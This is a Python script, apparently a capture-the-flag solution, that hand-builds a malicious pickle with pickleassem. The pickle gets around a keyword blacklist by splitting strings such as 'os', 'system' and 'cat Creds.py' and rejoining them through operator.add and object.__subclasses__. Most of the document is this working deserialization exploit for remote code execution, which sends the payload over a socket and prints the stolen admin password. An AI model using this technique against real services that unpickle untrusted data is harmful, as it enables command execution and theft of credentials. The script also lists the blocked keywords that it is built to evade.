import pickle
from pickletools import *
from base64 import b64encode
import socket

from pickleassem import PickleAssembler
# A simple pickle assembler to make handcrafting pickle bytecode easier.
# See: https://github.com/gousaiyang/pickleassem

SERVER = 'localhost'   # Update accordingly
PORT = 33402

pa = PickleAssembler(proto=4)

##### BLACKLISTED WORDS #####
# pa.push_mark()
# pa.push_short_binunicode('os')
# pa.push_short_binunicode('sys')
# pa.push_short_binunicode('system')
# pa.push_short_binunicode('sh')
# pa.push_short_binunicode('cat')
# pa.push_short_binunicode('import')
# pa.push_short_binunicode('open')
# pa.push_short_binunicode('globals')
# pa.push_short_binunicode('Creds')
# pa.pop_mark()
#############################

pa.push_global('builtins','print')

pa.push_global('builtins','getattr')
pa.memo_memoize()                       # memo as 0
pa.build_dup()
pa.build_dup()
pa.build_dup()
pa.build_dup()                          # getattr func  x 5

pa.push_global('builtins','object')

pa.push_short_binunicode('__subclasses__')
pa.build_tuple2()                       # (object, '__subclasses__')
pa.build_reduce()                       # getattr(object, '__subclasses__')

pa.push_empty_tuple()

pa.build_reduce()                       # object.__subclasses__()

pa.push_short_binunicode('__getitem__')
pa.build_tuple2()                       # (object.__subclasses__(),'getitem')

pa.build_reduce()                       # getattr(object.__subclasses__(),'getitem')

pa.push_int(120)
pa.build_tuple1()
pa.build_reduce()                       # getitem(120) => BuiltinImporter

pa.push_empty_tuple()
pa.build_newobj()                       # BuiltinImporter()

pa.push_short_binunicode('load_module')
pa.build_tuple2()                       # (BuiltinImporter(), 'load_module')
pa.build_reduce()                       # BuiltinImporter().load_module

pa.memo_memoize()                       # memo as 1

pa.push_short_binunicode('operator')
pa.build_tuple1()                       # ('operator')
pa.build_reduce()                       # load_module('operator')

pa.push_short_binunicode('add')
pa.build_tuple2()                       # (operator, 'add')
pa.build_reduce()                       # operator.add

pa.memo_memoize()                       # memo as 2

pa.push_short_binunicode('o')
pa.push_short_binunicode('s')

pa.build_tuple2()                       # ('o','s')
pa.build_reduce()                       # add('o','s')

pa.memo_memoize()                       # memo as 3
pa.pop()

pa.memo_binget(1)                       # load_module
pa.memo_binget(3)
pa.build_tuple1()                       # ('os',)

pa.build_reduce()                       # load_module('os')

pa.memo_binget(2)
pa.push_short_binunicode('sy')
pa.push_short_binunicode('stem')
pa.build_tuple2()
pa.build_reduce()                       # 'system'
pa.build_tuple2()                       # (os, 'system')
pa.build_reduce()                       # os.system

INJECTION1 = 'ca'
INJECTION2 = 't Cr'
INJECTION3 = 'eds.py'

pa.memo_binget(2)
pa.memo_binget(2)
pa.push_short_binunicode(INJECTION1)
pa.push_short_binunicode(INJECTION2)
pa.build_tuple2()
pa.build_reduce()
pa.push_short_binunicode(INJECTION3)
pa.build_tuple2()
pa.build_reduce()                       # 'cat Creds.py'

pa.build_tuple1()                       # ('cat Creds.py',)
pa.build_reduce()                       # os.system('cat Creds.py')

pa.build_tuple1()
pa.build_reduce()                       # print(os.system('cat Creds.py'))


# Memo #####
# 0: getattr
# 1: load_module
# 2: add
# 3: 'os'


payload = pa.assemble()
payload_b64 = b64encode(payload)

# For Debugging
# dis(payload, annotate=1)
print(f'Your serialized payload : {payload}\n')

print('[DEBUG] Checking against blacklist...',end='')
for word in ('os', 'sys', 'system', 'sh', 'cat', 'import', 'open', 'file', 'globals', 'Creds'):
    if word.encode() in payload:
        raise KeyError(f'\nThe pickle is spoilt :( {word}')
print(' ok.\n')

print(f'Your Evil Token : {payload_b64}\n')


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER,PORT))  

sock.recv(1024).decode()
sock.send("e\n".encode())
sock.recv(1024).decode()

sock.send(payload_b64+b'\n')
print(f'Admin password (aka flag) is {sock.recv(84).decode()[29:]}')